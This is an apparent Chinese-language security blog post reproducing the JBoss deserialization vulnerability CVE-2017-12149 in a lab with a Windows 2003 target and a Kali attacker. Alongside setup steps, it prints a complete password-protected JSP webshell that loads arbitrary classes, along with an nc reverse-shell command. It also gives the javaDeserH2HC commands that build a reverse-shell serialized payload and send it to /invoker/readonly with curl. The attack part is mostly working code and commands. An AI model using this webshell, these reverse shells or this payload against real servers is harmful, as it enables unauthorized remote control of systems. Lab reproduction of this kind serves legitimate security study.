#  Jboss反序列化漏洞(CVE-2017-12149)漏洞复现nc与javaDeserH2HC反弹shell   
原创 Cauchy  Cauchy网安   2025-05-19 09:12  
  
# 环境  
  
搭建jboss：win2003:（192.168.2.148） 攻击机:kali（192.168.2.129）  
# 序列化  
  
序列化就是将对象 object、字符串 string、数组 array、变量，转换成具有⼀定格式的字符串，使其能在文件储存或传输的过程中保持稳定的格式，目的就是为了方便传输。  
# 什么是反序列化漏洞:  
  
简单来说，反序列化就是序列化的逆过程。程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，通过在参数中注入⼀些代码，从而达到代码执行，SQL 注入，目录遍历等不可控后果，危害较大。 2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了 JBOSS Application Server 反序列化命令执行漏洞（CNVD-2017-33724，对应 CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。  
# Jboss 反序列化(CVE-2017-12149)的原理  
  
JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。在/invoker/readonly路径下，攻击者可以构造序列化代码传入服务器进行反序列化，由于没有对反序列化作进行任何检测，导致攻击者可以执行任意代码。  
# JBoss 反序列漏洞利用  
# 实验环境  
  
win2003  
# 影响版本  
  
JBoss 5.x / 6.x  
# 文件及源代码  
  
需要的在私信或者后台免费领取  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4upLgFP3G0bT1GU33oH6RacgRyAvLZt2EeVS0UcsXe1brgBTqexb6xg/640?wx_fmt=png&from=appmsg "")  
  
# 搭建环境（Win2003）  
## 安装 java（JDK-6u45-windows-i586.exe）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4ibyQickmECEzoicYzpXCfteKZz2S0V6BVicX29ntYOLsLzDpWoEucrmYPQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4Tich0kE6FvM0gPYUkq77kLNEQlicUtkiciamw8e9PPsFWnzxXeKtHLP1IQ/640?wx_fmt=png&from=appmsg "")  
## 配置java环境变量  
### 安装jdk配置环境变量  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4oXeQNKYiadK5ND2z5cbXX85FzaKuiaozKZbic91WAic8SaCibQtIabKjarg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4PQ6EWFKaQ0icnPbiaAukxEwmANDEUChka9Yum66zd4l8IiafxefCBpDcQ/640?wx_fmt=png&from=appmsg "")  
#### 新建环境变量  
##### 新建变量JAVA_HOME  
```
变量值：C:\Program Files\Java\jdk1.8.0_162(JDK的安装路径，这里以你自己的安装路径为准)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4UTFMAtcxHnIeHpuibQSG5HVupU6viaoysJCPuycYm0ibQjR6btZIjvp1g/640?wx_fmt=png&from=appmsg "")  
##### 新建CLASSPATH 变量  
```
变量值为：.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar(注意前面是有一个点的)，配置好之后如下图，这里是可以复制粘贴的
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4tOyul9ibefxhic09ibFWgiaRYwSBjNHdqrQb34pTQkicjhTxhw9bDxkcRYQ/640?wx_fmt=png&from=appmsg "")  
##### 配置path  
  
找到path，双击或者点编辑,  
```
;%JAVA_HOME%\bin
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4THCcjyDPkfKDaldJU0pSCAibmf59QedqVdPQZt6xRPqWD7Aibo2HQia1w/640?wx_fmt=png&from=appmsg "")  
  
点击确定即可  
##### 测试是否成功安装  
```
java -versionjavacjava
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4xPTmibIBibPdqnHovml92T8wJUZ63nmuibZntAkxI0BNtjwvTuwajQHMw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4uBLLh8aNvmuDF8FRwz1ZTPpKia0cCMK9QMdfVYiaF3tEoaLQ87alWKkw/640?wx_fmt=png&from=appmsg "")  
##   
## 安装jboss  
  
安装 jboss,把 jboss 文件夹放到 c 盘中，为了看着方便，我们将文件夹改名为 jboss  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4JIXUFMEOwnKaULEuZwqiaQBdSr3eIRawuDeDz9P7mK2XRXIBcUDw6ibA/640?wx_fmt=png&from=appmsg "")  
### 配置 jboss 环境变量  
```
新建系统变量：变量名：JBOSS_HOME  变量值：C:\jboss变量名：SystemRoot  变量值：C:\windows新建用户变量：变量名为：Path      变量值：%SystemRoot%/system32;%SystemRoot%;%JBOSS_HOME%\bin
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4MicK8HVYaEicVW7fiaX6XLRx66fFw13QfP031dLc5lKDmxIe8I1njDsGg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4cibqVgA2MU8BuQ9OiaWpWg0Bp4JjkanfwplFJGyJmdC2iat3a1Qyvhc8w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4NILv8q3g8bxnToRiaT0pOZzz0JLuI7Wymk9NicHT3sT2oiaiaYob8dlvzw/640?wx_fmt=png&from=appmsg "")  
**环境变量配置完毕。**  
  
接下来做一些设置,找到 server.xml 文件,修改 ip 地址和端口，修改之前先备份一下  通过记事本打开这个 server.xml 文件，找到 ip 地址配置。将这个${jboss.bind.address}改为 0.0.0.0 即可。如果想改端口的话，将 8080 改为 80 即可（不建议）。保存之后关闭，然后重新运行 jboss 。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4ZTInIcErLJFCShdGXrd2v6iadlO92kZAvyGUulc0zvBVELzHzgf58Hw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4V2lJS5wleCZSLLuq8n3HIRJiaU2SusxGY5W2zp8m8eq6Jh29RnEibncA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4CFANM9VA4l7VuwawzbVjBGXbhFnJib4eyVJb80JFmIFBg5DtSuiaX1Cg/640?wx_fmt=png&from=appmsg "")  
双击run.bat,解压的可能比较慢  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4Utbw9ccEC0VtPYe7oX9OtJzv176TtFW05zkiaokHiasZibmhNNFl7TtZQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4bYMf8yugER63LeRfiaicGc3teOAxRVnomVWLc850OSQgFZeGh0LUBWibA/640?wx_fmt=png&from=appmsg "")  
然后通过问一下 jboss 网址，http://192.168.2.148:8080 ,注意，一定要输入 http://才行，jboss 默认端口时 8080，（如IIS 中有网站端口冲突，记得修改）我们在浏览器输入如下网址，查看效果。（注意先不要启动jspstudy2016,否则会打不开这个 Jboss 控制台！！防止端口冲突）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4VibJXM2jUKqibKLiabgUpOGAA3eS70ABgt3mGOCgw0giaNTfsSBTiamyJvQ/640?wx_fmt=png&from=appmsg "")  
输入admin，admin登录  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4g61vGo5K4kajcOkGyzSNIJWfCszgve5dfVTRKOQvUmzLZAfVvXFtWA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4UgU6PZ5R9jbYJRiaurq70JufRwThlH2lyJlFVOYqNeMFGuLYEX2OIWQ/640?wx_fmt=png&from=appmsg "")  
# 通过jboss部署网址  
  
在控制台中找到web application（war）s --add a new resource--选择war文件上传--访问http://192.168.2.148:8080/test3693  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4KibpVr74X2E5daeVtsz4mD1YH04ZWcDV8cYDiavPOnFQ5I7Zw3acIicgA/640?wx_fmt=png&from=appmsg "")  
和 struct2 差不多，也是部署 war 包项目，放到当前文档所在目录中，大家可以直接选 test3693.war 使用  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4RMz1nSQU7EY55PibGJ5jxiciajZrDs9XgZvn05uhq6G74nFPJEQ8ZMkMA/640?wx_fmt=png&from=appmsg "")  
  
  
我们就可以直接访问了，重新打开 IE 浏览器中输入如下网址看效果: http://192.168.2.148:8080/test3693/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4YLCLoczliacvy42umCFfetnyea8B7CpVDM5ejMJN7NUjG3Qxxy84tNg/640?wx_fmt=png&from=appmsg "")  
# 上传木马  
  
在这里可以直接上传木马 test.jsp.密码：passwd  
```
<%!    class U extends ClassLoader {        U(ClassLoader c) {            super(c);        }        public Class g(byte[] b) {            return super.defineClass(b, 0, b.length);        }    }    public byte[] base64Decode(String str) throws Exception {        try {            Class clazz = Class.forName("sun.misc.BASE64Decoder");            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);        } catch (Exception e) {            Class clazz = Class.forName("java.util.Base64");            Object decoder = clazz.getMethod("getDecoder").invoke(null);            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);        }    }%><%    String cls = request.getParameter("passwd");    if (cls != null) {        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    }%>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V49dtgHlzMshibrQ7ZLCQEZxX40rDIMnJUmP2Ya51xKPwxCMCqQuQMzIw/640?wx_fmt=png&from=appmsg "")  
  
**上传成功**  
# 连接蚁剑  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4NDsTN2A0YNdWAWvEUuKEGfWT3MKtpWSrEDjz0X3Ctd0tnokib2rmRCA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4UJdLgWkdXJwqjOsTkwYAbweBGWnib1XB3yxwVsgzbdPOtTnV7f3GOWQ/640?wx_fmt=png&from=appmsg "")  
  
**连接成功**  
# 漏洞检测  
  
（1）访问链接(自己的IP)http://192.168.2.148:8080/invoker/readonly  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4Iu1UUthWIJsiaibuPO8NFpEKUJMQEBIMKGBxD90UIwTjvicBFxNdNRh1w/640?wx_fmt=jpeg&from=appmsg "")  
返回 500，一般就可以认为反序列漏洞存在检测发现漏洞  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4LicNjpGmFbsVmiaMPLCPRiawR4Dl5kHmdsmOk5ZuZwMgYbiaX1wa3stlVQ/640?wx_fmt=png&from=appmsg "")  
  
  
**执行**  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4icoJ6iceydLP1AdfdDNpx2Z6LZicFpatakEUduUHHuF5UhNjyIp6C4HXw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4CpDsDRgKy8bvuUk7DtJIAduEuAGKic2ibehjluyfL4LYbcCsZ4vVovpQ/640?wx_fmt=png&from=appmsg "")  
  
**命令执行成功！！**  
# 反弹shell  
## 蚁剑反弹  
### 开启监听端口  
  
前面已经上传了jsp木马，蚁剑成功连接上了，先在kali开启监听窗口  
```
nc -lvvp 8888
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V41yGfdQwxWfJcVugTJ4wxQ4mJxS00qicWYEF2icEY8flMzib2XyqYDt9iaA/640?wx_fmt=png&from=appmsg "")  
### nc反弹shell  
  
我们先把nc上传到win2003（受害机），下载地址：https://eternallybored.org/misc/netcat/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4hlYrUeVfAsnPsNpCialKWXpq9OVPD5wkwZjrBL2hy7oQqwibdO6taC4Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4TI0EaRhYqOS9nwUndrwekwAXNBJlSOQn7SicnpKWXwa24zgVXyZjwIQ/640?wx_fmt=png&from=appmsg "")  
```
nc.exe 192.168.2.129 8888 -e cmd.exe
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4l6klpTEibBYqfFxJy9lFuibEHp8xgR5pKZnwic7FRDYCdCGjHZv5WGTUg/640?wx_fmt=png&from=appmsg "")  
**kali返回成功**  
## javaDeserH2HC反弹  
  
为了保证连接的稳定，就可以用我们的测试利用工具进行反弹：JavaDeserH2HC（需要安装配置jdk环境）  
### 下载javaDeserH2HC  
```
下载地址：https://github.com/joaomatosf/JavaDeserH2HC
```  
  
解压到KALI后执行如下反弹shell命令。  
### 编译生成数据流  
  
用指定的类路径（当前目录和 commons-collections-3.2.1.jar）编译 ReverseShellCommonsCollectionsHashMap.java 文件，生成对应的 .class 文件  
```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4VPXgIXFfpDUsB6bW2xUM9KtGxictgC86Mu3nU80EJClQSrYibO1VV8Zw/640?wx_fmt=png&from=appmsg "")  
启动 ReverseShellCommonsCollectionsHashMap 程序，运行时能访问当前目录和 commons-collections-3.2.1.jar 中的类，192.168.2.129:4445（是kali监听的ip地址）的反弹shell用来做远程连接或其他网络操作。  
```
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.2.129:4445
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4nFMsuSDhrXfquthHReU0TtK8fYJPLf9CURbZjxqHZ6VrPo2Vv70C0A/640?wx_fmt=png&from=appmsg "")  
  
执行完成会在当前目录下生成一个.ser序列化数据流  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4V10n4HAFWFm5QQ2Chj6I98Y1QSwae8TBGGmwt55oSeoI1DrHHL3LlQ/640?wx_fmt=png&from=appmsg "")  
  
### kali开启监听端口  
```
nc -lvvp 4445
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4qP3pZujpJGEtH4BAeROmukMEzibvfHwrWA0jPoibumXHEvQEyHh6Sia9Q/640?wx_fmt=png&from=appmsg "")  
### 发送数据包  
```
curl http://192.168.2.148:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V42FuK5NIAtXRMUglDBy9omcibtGKpib73JyV0vWmzPicj7wib2A6LuNQKVQ/640?wx_fmt=png&from=appmsg "")  
### 反弹shell成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkSbYqichFnO2rkVBMEdsC0V4gHepp5wRAIYNFUo6VMXXYyN5ayLeZhN1PnEgqKPlCjC12y2Dl3nFbw/640?wx_fmt=png&from=appmsg "")  
  
这里有一个注意的点就是jdk的版本要低于1.8，最好是1.8  
  
**感兴趣的可以关注微信 公众号【Cauchy网安】，一起一步步慢慢来，该到达的高度终将会抵达的，加油，如有雷同纯属巧合**  
  
